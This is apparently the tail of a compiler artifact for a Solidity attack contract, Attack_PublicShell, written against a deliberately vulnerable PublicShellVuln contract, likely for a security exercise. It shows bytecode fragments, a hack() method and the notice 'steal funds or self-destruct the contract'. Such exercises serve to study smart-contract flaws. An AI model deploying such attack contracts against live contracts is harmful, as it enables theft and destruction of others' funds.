PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x2AA DUP3 PUSH2 0x268 JUMP JUMPDEST PUSH2 0x2B4 DUP2 DUP6 PUSH2 0x272 JUMP JUMPDEST SWAP4 POP PUSH2 0x2C4 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x282 JUMP JUMPDEST PUSH2 0x2CD DUP2 PUSH2 0x290 JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH0 DUP4 ADD MSTORE PUSH2 0x2F0 DUP2 DUP5 PUSH2 0x2A0 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DELEGATECALL DUP6 PUSH17 0xE0FD9D17857E83BF222350D153C4375079 0xD2 0xE7 0xD2 0xEF 0xE4 0xB6 SWAP3 0xEA 0xEC PUSH7 0x425064736F6C63 NUMBER STOP ADDMOD BYTE STOP CALLER "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "162800",
						"executionCost": "infinite",
						"totalCost": "infinite"
					},
					"external": {
						"hack()": "infinite",
						"target()": "infinite"
					}
				},
				"methodIdentifiers": {
					"hack()": "4de260a2",
					"target()": "d4b83992"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 49,
						"contract": "S/Shell/Shell.sol:Attack_PublicShell",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_contract(PublicShellVuln)45"
					}
				],
				"types": {
					"t_contract(PublicShellVuln)45": {
						"encoding": "inplace",
						"label": "contract PublicShellVuln",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"notice": "Attack: steal funds or self‑destruct the contract",
				"version": 1
			}
		}
	}
}